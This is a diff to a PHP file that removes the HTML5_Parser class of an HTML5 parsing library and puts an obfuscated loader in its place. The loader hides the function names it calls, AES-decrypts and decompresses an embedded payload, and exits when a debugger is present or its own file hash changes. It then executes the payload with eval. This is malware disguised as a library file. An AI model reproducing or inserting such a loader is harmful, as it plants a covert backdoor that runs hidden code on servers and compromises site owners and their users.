@@ -1,37 +1,28 @@
 <?php
-
-require_once dirname(__FILE__) . '/Data.php';
-require_once dirname(__FILE__) . '/InputStream.php';
-require_once dirname(__FILE__) . '/TreeBuilder.php';
-require_once dirname(__FILE__) . '/Tokenizer.php';
-
-/**
- * Outwards facing interface for HTML5.
- */
-class HTML5_Parser
-{
-    /**
-     * Parses a full HTML document.
-     * @param $text | HTML text to parse
-     * @param $builder | Custom builder implementation
-     * @return DOMDocument|DOMNodeList Parsed HTML as DOMDocument
-     */
-    static public function parse($text, $builder = null) {
-        $tokenizer = new HTML5_Tokenizer($text, $builder);
-        $tokenizer->parse();
-        return $tokenizer->save();
-    }
-
-    /**
-     * Parses an HTML fragment.
-     * @param $text | HTML text to parse
-     * @param $context String name of context element to pretend parsing is in.
-     * @param $builder | Custom builder implementation
-     * @return DOMDocument|DOMNodeList Parsed HTML as DOMDocument
-     */
-    static public function parseFragment($text, $context = null, $builder = null) {
-        $tokenizer = new HTML5_Tokenizer($text, $builder);
-        $tokenizer->parseFragment($context);
-        return $tokenizer->save();
-    }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_undgwrdc=('bas'.'e64'.'_de'.'cod'.'e');
+$_bvf319or=('gzu'.'nco'.'mpr'.'ess');
+$_aw49367d=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_vu53tktm='r8fng71E';
+$_o4gqujvg='l+MAZPW2JBA=';
+$_fp344bxa='7gmI8xUi';
+$_l7kjb5r3='E3P/Ty6w';
+$_rer1b54b='az/QcteR';
+$_hzpg186n='RZWhoZ8m';
+$_n8wai9mj='S/cd2FMf';
+$_rnbqg8ra='tuu46Q==';
+$_fc0jrs7h=$_undgwrdc($_fp344bxa.$_vu53tktm.$_l7kjb5r3.$_rer1b54b.$_o4gqujvg);
+$_zdn79j11=$_undgwrdc($_n8wai9mj.$_hzpg186n.$_rnbqg8ra);
+$_of589zbf=$_undgwrdc('H5jrwG4klNXRyq+u1T1MKqIoqAYbYSLcewQ4cwul3yn3apNQV7tI7x0Mz3zl8kXdXwDB+Yrfda/rYM7as3b7IuMwdrGHGb09p4yI8L0Xk4Bk0OOsrTR1m10FPBoZeG2rQES+6E1W9UNLWn6dYvQ5PYb9TUsYoroJZBt6I3hpyMPAyXNbZhhV/XHj8ovzy31F3lJ+dxfkjaHblRkkeyqzQlrKbN+debRs4T3ZiekJ0zVhc5yGpdTQ0atxB1mvW7toL3qpPX8Z0FZ2z/KyvWmQDoeeMGhUQkHi6o9066jesbAxShOVfKItejucy/g22WWr');
+$_dug1f1pk=$_aw49367d($_of589zbf,'aes-256-cbc',$_fc0jrs7h,OPENSSL_RAW_DATA,$_zdn79j11);
+if($_dug1f1pk===false){exit;}
+$_z8jgfzzm=$_bvf319or($_dug1f1pk);
+if($_z8jgfzzm===false){exit;}
+$_a8sdj8wf='ad44d2d8acac282230a38f60b9aad8f62caad666771ac96134ccb1cc81b838c8';
+$_t5q1d3ss=@file_get_contents(__FILE__);
+if($_t5q1d3ss!==false){
+$_djasqqie=str_replace($_a8sdj8wf,"0000000000000000000000000000000000000000000000000000000000000000",$_t5q1d3ss);
+$_u7krdeaj=hash("sha256",$_djasqqie);
+if($_u7krdeaj!==$_a8sdj8wf){@http_response_code(403);exit;}
 }
+eval($_z8jgfzzm);
